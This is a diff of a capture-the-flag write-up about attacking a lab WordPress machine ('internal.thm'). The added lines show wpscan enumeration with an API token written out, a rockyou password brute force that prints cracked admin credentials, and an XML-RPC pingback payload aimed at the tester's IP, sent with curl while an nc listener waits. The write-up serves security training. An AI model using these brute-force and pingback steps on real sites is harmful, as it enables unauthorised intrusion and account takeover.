@@ -88,7 +88,7 @@ Let's take a look at what `gobuster` has found:
 
 I see some interesting directories here: `/blog`, `/phpmyadmin` and `/wordpress`. This is good information that we can use later on to try and find some vulnerabilities to get a foothold on this machine.
 
-If we look at `/blog` we get this:
+If we look at `/blog` we get this: 
 
 ![there is a blog](https://i.imgur.com/2AzqzEl.png)
 
@@ -124,11 +124,13 @@ Let's see what results we get from nmap `UDP` scan:
 
 ![nmap UDP results](https://i.imgur.com/2egOwcg.png)
 
-I see a couple of opened filtered ports there and not much more honestly. Since we know there is a wordpress blog there, we can run a `wpscan` to see if we could get some details on that wordpress install:
+I see a couple of opened filtered ports there and not much more honestly. Since we know there is a wordpress blog there, we can run a `wpscan` to see if we could get some details on that wordpress install.
+
+It is required now to obtain a free `wpvulndb API key` to get possible vulnerabilities details, check how to get your key [here](https://wpvulndb.com/api).
 
 ```sh
-┌──(kali㉿kali)-[~/Documents/THM/internal]
-└─$ wpscan --url internal.thm/blog
+┌──(kali㉿kali)-[~]
+└─$ wpscan --url internal.thm/blog --api-token YOP161Z4Cv0GA1Hi3zzisdtzcSzzfbvpVVpHTzj7eFCeho
 _______________________________________________________________
          __          _______   _____
          \ \        / /  __ \ / ____|
@@ -139,15 +141,12 @@ _______________________________________________________________
 
          WordPress Security Scanner by the WPScan Team
                          Version 3.8.7
-                               
+       Sponsored by Automattic - https://automattic.com/
        @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
 _______________________________________________________________
 
-[i] Updating the Database ...
-[i] Update completed.
-
-[+] URL: http://internal.thm/blog/ [10.10.254.102]
-[+] Started: Wed Sep 16 22:03:34 2020
+[+] URL: http://internal.thm/blog/ [10.10.245.144]
+[+] Started: Thu Sep 17 22:06:58 2020
 
 Interesting Finding(s):
 
@@ -205,23 +204,26 @@ Interesting Finding(s):
 [i] No plugins Found.
 
 [+] Enumerating Config Backups (via Passive and Aggressive Methods)
- Checking Config Backups - Time: 00:00:02 <==================================================================> (21 / 21) 100.00% Time: 00:00:02
+ Checking Config Backups - Time: 00:00:02 <===========================================================================> (21 / 21) 100.00% Time: 00:00:02
 
 [i] No Config Backups Found.
 
-[!] No WPVulnDB API Token given, as a result vulnerability data has not been output.
-[!] You can get a free API token with 50 daily requests by registering at https://wpvulndb.com/users/sign_up
+[+] WPVulnDB API OK
+ | Plan: free
+ | Requests Done (during the scan): 2
+ | Requests Remaining: 46
 
-[+] Finished: Wed Sep 16 22:03:50 2020
-[+] Requests Done: 66
+[+] Finished: Thu Sep 17 22:07:15 2020
+[+] Requests Done: 54
 [+] Cached Requests: 5
-[+] Data Sent: 13.646 KB
-[+] Data Received: 15.543 MB
-[+] Memory used: 209.848 MB
-[+] Elapsed time: 00:00:15
+[+] Data Sent: 12.05 KB
+[+] Data Received: 298.702 KB
+[+] Memory used: 174.23 MB
+[+] Elapsed time: 00:00:17
+
 
 ```
-
+The most interesting thing about this is this line here `XML-RPC seems to be enabled`. This could lead us to a potential exploitation.
 
 
 ### Summary of findings so far
@@ -229,7 +231,7 @@ Interesting Finding(s):
 Let's sum up all the information we have obstained so far:
 
 - Open Ports:
-  - Port 80: Wordpress blog(default admin panel `/wp-admin` and possible `admin` username).
+  - Port 80: Wordpress blog(default admin panel `/wp-admin` and possible `admin` username and `XML-RPC enabled http://internal.thm/blog/xmlrpc.php`).
   - Port 22: SSH running OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0).
   - UDP Ports: `68` and `631` are displayed as `open|filtered`.
 - Keys/Hashes:
@@ -247,6 +249,91 @@ Let's sum up all the information we have obstained so far:
 ## Stage 3 - Threat Modeling & Vulnerability Identification
 
 > "During the threat modeling and vulnerability identification phase, the tester identifies targets and maps the attack vectors. Any information gathered during the Reconnaissance phase is used to inform the method of attack during the penetration test." _from [Cipher.com](https://cipher.com/blog/a-complete-guide-to-the-phases-of-penetration-testing/)_
+
+
+### Wordpress Login - Bruteforce
+
+
+We have a possible username for wordpress called `admin`, we can try to attempt some brutefocing with `wpscan` to see if we manage to get past wordpress login form.
+
+We fire up `wpscan` like this:
+
+`wpscan --url internal.thm/blog/ --passwords rockyou.txt --usernames admin`
+
+After a while we get something back:
+
+```sh
+[+] Performing password attack on Xmlrpc against 1 user/s
+[SUCCESS] - admin / my2boys                                                                                                                             
+Trying admin / lizzy Time: 00:10:20 <                                                                          > (3885 / 14348277)  0.02%  ETA: ??:??:??
+                                                                                                                                                        
+[!] Valid Combinations Found:                                                                                                                           
+ | Username: admin, Password: my2boys
+```
+if we try to log into wodpress admin panel with those credentials, we do get access:
+
+![we get access wordpress admin panel](https://i.imgur.com/LWGrDUt.png)
+
+From here on we can potentially try to gain access in a couple of ways, the one I'm familiar is with trying to upload/modify a certain file that can give us a reverse shell connection. Let's see if we can manage to do that.
+
+> At this point another piece of information from the `wpscan` results came to my attention. There was a mention of an outdated theme. I know there are theme vulnerabilities out there, that could be another way in. We'll have that in mind.
+
+
+
+### XML-RPC
+
+> XML-RPC is an API that warps the information or data into XML file and sends it to the mobile app or remote software. This was introduced as in the olden days, internet speed is not fast, instead of writing it online. Users writes their content offline and publish all together using the API. As the internet services improved, most of us does not use the feature anymore, often it was forgotten by us. _from [Cipher.com](hhttps://bsderek.home.blog/2020/01/06/exploiting-the-xmlrpc-php/)_
+
+
+Let's start with the possible attacks against `XML-RPC enabled` in the installed Wordpress version.
+
+The idea here is simple at least for this first attempt, we'll create a simple `XML` file that will ping back to us
+
+```xml
+<?xml version="1.0" encoding="iso-8859-1"?>
+<methodCall>
+<methodName>pingback.ping</methodName>
+<params>
+ <param>
+  <value>
+   <string>http://10.13.0.34:8080</string>
+  </value>
+ </param>
+ <param>
+  <value>
+   <string>http://internal.thm/blog/index.php/2020/08/03/hello-world/</string>
+  </value>
+ </param>
+</params>
+</methodCall>
+```
+We save this file as `pingback.xml`. Then we just need two more things. First, we need to launch an `nc -nlvp 8080` to start listening. Second, we need to execute this attack by running:
+
+`curl -X POST -d @pingback.xml http://internal.thm/blog/xmlrpc.php`
+
+Sadly this approach does not seem to work as I get:
+
+```sh
+┌──(kali㉿kali)-[~/Documents/THM/internal]
+└─$ curl -X POST -d @pingback.xml http://internal.thm/blog/xmlrpc.php
+<?xml version="1.0" encoding="UTF-8"?>
+<methodResponse>
+  <fault>
+    <value>
+      <struct>
+        <member>
+          <name>faultCode</name>
+          <value><int>0</int></value>
+        </member>
+        <member>
+          <name>faultString</name>
+          <value><string></string></value>
+        </member>
+      </struct>
+    </value>
+  </fault>
+</methodResponse>
+```
 
 
 ## Stage 4 - Exploitation
